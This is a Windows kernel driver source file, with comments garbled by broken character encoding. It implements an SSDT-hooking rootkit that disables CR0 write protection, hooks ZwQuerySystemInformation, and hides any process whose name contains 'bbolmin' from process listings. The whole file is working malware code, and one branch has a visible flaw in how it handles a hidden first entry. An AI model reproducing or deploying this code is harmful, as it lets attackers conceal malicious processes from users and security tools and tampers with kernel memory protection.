#include "hook.h"


// CR0 �������Ϳ� ���ؼ� �޸� ��ȣ�� ����ȭ �ϴ� �ڵ�


//Write���� �ֱ�
VOID Set_Write(VOID)
{
	__asm {
		push eax;
		mov eax, cr0;
		and eax, WP_MASK;
		mov cr0, eax;
		pop eax;
	}
}

//Write���� ����
VOID Set_Read(VOID)
{
	__asm {
		push eax;
		mov eax, cr0;
		or eax, not WP_MASK;
		mov cr0, eax;
		pop eax;
	}
}


ZWQUERYSYSTEMINFORMATION OrgZwQuerySystemInformation = NULL;		//Original ZwQuerySystemInformation �Լ� ���



																	// ���ο� ZwQuerySystemInformation �Լ� ����
NTSTATUS
NewZwQuerySystemInformation(
	IN ULONG SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG RetunLength
)
{
	NTSTATUS ntStatus;

	ntStatus = ((ZWQUERYSYSTEMINFORMATION)OrgZwQuerySystemInformation) (
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		RetunLength
		);


	if (NT_SUCCESS(ntStatus))
	{
		if (SystemInformationClass == 5) // ���μ��� ����Ʈ�� ���ϴ� ���
		{
			struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES*) SystemInformation;
			struct _SYSTEM_PROCESSES *prev = NULL;

			while (curr)
			{
				if (curr->ProcessName.Buffer != NULL)
				{
					if (wcsstr(curr->ProcessName.Buffer, L"bbolmin") != NULL) // bbolmin���� �ٽ� �ٲ�
					{
						if (prev)	//ù��°�� �ƴ� ���
						{
							if (curr->NextEntryDelta)
								prev->NextEntryDelta += curr->NextEntryDelta;	//���� ���μ��� ��Ʈ���� �ѱ�
							else
								prev->NextEntryDelta = 0;						//�������� ���
						}
						else		//ù��°�� ���
						{
							if (curr->NextEntryDelta)								//���� ��Ʈ���� ��������
								SystemInformation = (struct _SYSTEM_PROCESSES *) ((char *)curr + curr->NextEntryDelta);
							else
								SystemInformation = NULL;						//}�������� ����
						}

					}
					else
						prev = curr;											//hide�� ��Ʈ���� ��쿡�� ���� ��Ʈ���� �������� �ʾƾ���.

				}
				else
					prev = curr;

				if (curr->NextEntryDelta)
					curr = (struct _SYSTEM_PROCESSES *) ((char *)curr + curr->NextEntryDelta);
				else
					curr = NULL;
			}
		}
	}

	return ntStatus;
}



void SetHook()
{
	OrgZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)(SYSTEM_SERVICE(ZwQuerySystemInformation));

	Set_Write();
	HOOK_SYSCALL(ZwQuerySystemInformation, NewZwQuerySystemInformation);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Set Hook Code !");
	Set_Read();
}

void UnHook()
{
	Set_Write();
	HOOK_SYSCALL(ZwQuerySystemInformation, OrgZwQuerySystemInformation);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "UnHooked !");
	Set_Read();
}


extern "C"
//����̹� ��ε� ��ƾ
VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[UnLoad]");
	//SSDT ��ŷ����
	UnHook();
}

extern "C"
NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath)
{
	UNREFERENCED_PARAMETER(theRegistryPath);
	theDriverObject->DriverUnload = OnUnload;

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[Load]");
	//SSDT ��ŷ
	SetHook();

	return STATUS_SUCCESS;
}

// ssdt ��ŷ�̶�� �� �� ����.
// User Mode �� ��ŷ�̶�� ������

// ���μ��������� ���ϴ� �Լ� -> zwquerysysteminformation	[User] | [Kernel] -> ssdt -> ntquerysysteminformation

// ���μ��� ������ ���ϴ� �Լ� -> zwquerysysteminformation -> newzwquerysysteminformation -> OrgZwQuerySystemInformation [User] | [Kernel] -> ssdt -> ntquerysysteminformation


// �ƾ� ���� 
